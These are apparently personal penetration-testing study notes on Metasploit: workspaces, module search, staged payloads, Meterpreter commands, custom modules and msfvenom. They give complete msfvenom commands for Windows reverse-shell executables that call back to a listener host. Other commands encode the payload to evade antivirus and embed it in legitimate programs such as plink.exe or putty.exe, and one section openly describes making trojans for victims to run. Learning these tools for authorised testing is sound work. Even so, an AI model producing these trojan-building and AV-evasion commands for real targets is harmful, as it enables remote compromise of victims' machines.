# MSF 

# WORKSPACES
# Create workspace
workspace -a

# Call workspaces
workspace

# Switch to workspace
workspace spaceName

## basics

//search
msf-pro > search platform:Windows
msf-pro > search type:exploit
msf-pro > search author:hd
msf-pro > search app:client
msf-pro > search name:ms08-067
//serach for contains http
grep http search type:exploit Apache


//Scanning dirs of webpages
auxiliary/scanner/http/dir_scanner

# options in module use options  to set for instance lhost, ports etc. to bypass firewalls
`options`

# payloads
in module type `show payloads` to show payloads

## Stage vs non staged payloads 

Overall there are non-staged  (pattern: linux/x86/shell_bind_ipv6_tcp) and staged (linux/x86/meterpreter/reverse_ipv6_tcp) on msf. stage will be done with a couple of smaller payloads

* settings different payload because the stage payload we provided might fail: `set payload linux/ => hit double tab`

see image ime/stagedVsNonStagedPayloads.png

# info
seach for a module and then for instance type
`info 2` to get information about the 3rd module

# check before exploit
run the `check` command before starting and exploit

# Meterpreter Payloads
Meterpreter 712 is a multi-function payload that can be dynamically extended at run-time. In practice, this means that the Meterpreter shell provides more features and functionality than a regular command shell, offering capabilities such as file transfer, keylogging, and various other methods of interacting with the victim machine.

* in module type: `search meterpreter type:payload`
* use `help` command to get information about meterperter commands
* upload files `upload /usr/share/windows-resources/binaries/nc.exe c:\\Users\\Offsec`
* download file `download c:\\Windows\\system32\\calc.exe /tmp/calc.exe`
* Can then also switch to the native shell via `shell` and then return to meterpreter by `exit`

# Executable Payloads
The Metasploit Framework payloads can also be exported into various file types and formats, such as ASP, VBScript, Jar, War, Windows DLL and EXE, and more.

let’s use the msfvenom utility to generate a raw Windows PE reverse shell executable. We’ll use the `-p` flag to set the payload, set LHOST and LPORT to assign the listening host and port, `-f` to set the output format ( exe in this case), and `-o` to specify the output file name
* `msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -o shell_reverse.exe` and check file `file shell_reverse.exe`
* `-e` to encode those files to avoid AntiVirusDetection: `msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe`
* Another useful feature of Metasploit is the ability to inject a payload into an existing PE file, which may further reduce the chances of AV detection by: `msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe`

# Metasploit Exploit Multi Handler (if f.e.: we do not want to user NC)
used Netcat to catch standard reverse shells, such as those generated by the windows/shell_reverse_tcp payload, but might not work for some machines.
* we should use the framework `multi/handler` module, which works for all single and multi-stage payloads
 `use multi/handler` =>  `set payload windows/meterpreter/reverse_https` => `exploit`

# Adding custom modules

https://fmash16.github.io/content/writeups/hackthebox/htb-Passage.html

1) with searchsploit you can download file (see reconainssance)
2) save file in for instance:  /home/kali/.msf4/modules/exploits/cgi/webapps/ => having [exploits] or [auxilliary] is important
3) in msf reload modules by reload_all
4) custom module should appear

=> logs can be checked under: /home/kali/.msf4/logs/
![stagedVsNonStagedPayload](img/stagedVsNonStagedPayload.png)

# msfvenom (file generation)
* When we have secure systems (so system does not have known vulnurabilities), we can create trojans and make somebody open it.
* we can use msfvenom to generate malicous file for f.e: exe, apk, py, etc. The process is that we generate this trojan and once somebody exexutes this file we will have a connection to the victim.

Example: 
`/usr/bin/msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.5 LPORT=5555 -f exe -o sampleTrojan.exe`
but you can also encode it and attach it to a valid programm (like f.e.: putty.exe with -x)

Set up connection with msfconsole `use exploit/multi/handler`
## Virustotal toe check if payloads got recongized: https://www.virustotal.com/gui/



